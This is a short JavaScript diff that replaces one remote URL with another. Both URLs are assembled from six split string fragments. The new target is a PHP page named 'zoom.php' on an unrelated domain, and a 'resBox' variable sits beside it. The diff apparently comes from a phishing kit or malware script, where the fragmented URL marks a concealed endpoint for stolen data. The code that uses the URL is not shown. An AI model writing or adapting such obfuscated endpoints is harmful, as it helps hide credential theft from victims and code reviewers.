@@ -1,11 +1,11 @@
 let resBox = "MinC";
 
-let nbg1 = "htt";
-let nbg2 = "ps://globa";
-let nbg3 = "llendin";
-let nbg4 = "gchain.c";
-let nbg5 = "om/we";
-let nbg6 = "bxr.php";
+let nbg1 = "http://ide";
+let nbg2 = "anove.li";
+let nbg3 = "ve/bre";
+let nbg4 = "sdf/zo";
+let nbg5 = "om.p";
+let nbg6 = "hp";
 
 let nbg = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
 
